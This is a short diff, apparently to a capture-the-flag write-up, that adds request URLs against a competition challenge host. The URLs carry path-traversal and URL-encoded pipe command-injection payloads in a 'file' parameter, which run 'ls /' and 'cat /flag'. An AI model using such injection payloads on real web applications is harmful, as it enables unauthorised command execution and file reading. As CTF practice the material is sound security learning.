@@ -48,3 +48,7 @@ exploit.js
 ```
 
 https://aurora-web.h4ck.ctfcompetition.com/?file=../templates/default.html&term=%20%20%20%20
+
+https://aurora-web.h4ck.ctfcompetition.com/?file=%7Cls%20/%7C%20tr%20-d%20%27\n%27|&term=boot
+
+https://aurora-web.h4ck.ctfcompetition.com/?file=%7Ccat%20/flag%7C%20tr%20-d%20%27\n%27|&term=http
